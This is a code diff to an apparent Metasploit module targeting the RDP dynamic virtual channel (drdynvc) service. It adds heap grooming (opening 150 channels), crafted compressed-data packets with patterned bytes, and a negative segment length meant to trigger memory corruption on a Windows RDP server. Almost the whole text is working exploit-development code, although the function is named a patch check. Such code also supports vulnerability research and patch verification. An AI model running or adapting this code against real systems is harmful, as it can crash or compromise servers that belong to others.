@@ -105,6 +105,24 @@ class MetasploitModule < Msf::Auxiliary
     status
   end
 
+  def create_heap_objects
+    # open a dvc to create a heap object
+    150.times do |_|
+      payload = build_virtual_channel_pdu(0x03, "\x10\x03#{ Rex::Text.rand_text_alpha_lower(7) }\x00")
+      resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
+
+      sleep(0.1)
+    end
+  end
+
+  # see [MS-RDPEGFX] section 2.2.5.2
+  def build_rdp_data_segment(data)
+    # RDP_DATA_SEGMENT
+    encoded = [data.length].pack("L<")
+    encoded << "\x04"
+    encoded << data
+  end
+
   def check_for_patch
     #begin
     #  while true do
@@ -114,25 +132,40 @@ class MetasploitModule < Msf::Auxiliary
     #  # we don't care
     #end
 
-    payload = build_virtual_channel_pdu(0x03, "\x50\x00\x03\x00\x00\x00")
-    resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
+    # Send: DVC Capabilities Request
+    payload = build_virtual_channel_pdu(0x03, "\x50" + "\x00" + "\x03\x00" + "\x33\x33" + "\x11\x11" + "\x3d\x0a" + "\xa7\x04")
+    rdp_send(rdp_build_pkt(payload, 'drdynvc'))
+
+    create_heap_objects
 
     # see [MS-RDPEGFX] section 2.2.5
-    rdp8_bulk_encoded_data = "\x04" + ("\x41" * 0x200)
-    rdp_data_segment = [0x200].pack("L<") + rdp8_bulk_encoded_data
+    rdp_data_segment = build_rdp_data_segment(("\x41" * 0x40) + ("\x42" * 0x40) + ("\x43" * 0x80) + ("\x00" * (0x200 - 0x100)))
     rdp_segmented_data = [0xe1, 1, 1 - 0x2000].pack("CS<l<") + rdp_data_segment
     print_status('=== Sending second packet ===')
 
-    # see [MS-RDPEDYC]:24
-    payload = build_virtual_channel_pdu(0x03, [0b0111_00_00, 0x0b].pack("CC") + rdp_segmented_data)
+    # see [MS-RDPEDYC]:25 (DYNVC_DATA_COMPRESSED)
+    # 0b0111 - cmd  (0x07 data compressed)
+    # 0b00   - cbid (0x00 channel is field is 1 byte)
+    # 0b00   - sp   (0x00 unused, should be 0x00)
+    channel_id = 0x0b
+    payload = build_virtual_channel_pdu(0x03, [0b0111_00_00, channel_id].pack("CC") + rdp_segmented_data)
     resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
     #print_status("+++ Resp length: #{resp.length}")
 
-    print_status('Entering the dispatch loop')
+
+    # close channel
+    #channel_id = 0x0c
+    #payload = build_virtual_channel_pdu(0x03, [0b0100_00_00, channel_id].pack("CC"))
+    #resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
+
+
+    #print_status('Entering the dispatch loop')
     #rdp_dispatch_loop
     #return Exploit::CheckCode::Vulnerable if @found
 
-    sleep(5) # need to keep the socket open
+    print_status('sleeping to hold the socket open')
+    sleep(20) # need to keep the socket open
+    print_status('exiting')
   end
 
   def rdp_on_channel_receive(pkt, chan_user_id, chan_id, flags, data)
